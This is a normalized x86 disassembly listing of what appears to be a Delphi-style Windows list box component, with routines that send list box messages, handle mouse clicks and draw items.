push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_40445c
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_446be4
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_439a84
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4382c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4383c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383ce
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
call sub_41ac88
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_4383aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41ad44
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403448
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403448
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403448
sub_4383d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4428d8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_43fb80
mov edx 0x61
mov eax ebx
call sub_43fba4
mov dl 0x1
mov eax ebx
call sub_446e18
xor edx edx
mov eax ebx
call sub_440588
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43efa0
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4384c4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429fc
mov eax [ esi + 0x228 ]
call sub_40324c
mov eax [ esi + 0x218 ]
call sub_40324c
mov eax [ esi + 0x240 ]
call sub_40324c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_43850a
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_43857f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40445c
mov esi eax
mov eax esi
call sub_408904
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_40408c
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438586
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_438590
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4385b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4385ec
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43860c
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_446be4
push eax
call SendMessageA
sub_438640
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_438a80
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_438688
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43879f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4387a6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fc0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40445c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404194
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40445c
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404194
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_438a30
test al al
je r-xdata
jmp r-xdata
sub_4387b0
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_438a30
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_43881c
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_43fdc8
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a20
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov esi 0x1
sub_438870
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44414c
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax ebx
call sub_43881c
sub_4388b4
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_446be4
push eax
call SendMessageA
pop ebx
retn
sub_438930
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_446be4
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_446be4
push eax
call SendMessageA
jmp r-xdata
sub_43897c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_44414c
mov eax ebx
mov si 0xffd0
call sub_403448
sub_4389a4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_441578
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_438a30
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_446be4
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
sub_438a80
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_446be4
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_446be4
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_446be4
push eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
jmp r-xdata
sub_438ae8
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
jmp r-xdata
sub_438b54
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_44414c
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_438b30
sub_438bac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438c54
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438c5b
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_40445c
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408940
mov eax [ ebp - 0x4 ]
call sub_40425c
mov [ esi + 0xc ] eax
jmp r-xdata
sub_438c60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438cf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438cfd
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_40425c
mov [ esi + 0xc ] eax
jmp r-xdata
sub_438d18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_438b90
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_446be4
push eax
call SendMessageA
sub_438d44
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_438b54
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_438b54
jmp r-xdata
sub_438d88
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_438b90
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_441578
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_438e14
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_441578
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402c58
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_441578
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_438e78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443a38
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443964
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403448
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_438f90
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_443b64
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_446be4
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_43881c
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_446be4
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_439958
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_438d18
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d420
sub_439060
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_443f48
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_438b90
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_4390dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_4445c0
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_440b34
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44452c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_439142
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_4570cc
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_441a48
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440a6c
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406d48
mov edx esp
mov cl 0x1
mov eax esi
call sub_438d88
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_438a30
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_440a6c
jmp r-xdata
sub_4391e0
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43ffd0
mov eax esi
mov si 0xffeb
call sub_403448
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403448
jmp r-xdata
pop esi
retn
sub_439214
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_446be4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_446be4
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_446be4
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_446be4
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_446be4
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_438b90
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_418e04
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_439372
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_444d3c
push ebp
call sub_439214
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4393b8
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_43ff08
lea eax [ esp + 0x18 ]
call sub_406d5c
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_439418
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439524
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_423ac4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43952b
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edx 0x824
mov eax ebx
call sub_4426a4
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_439a3c
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403f9c
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
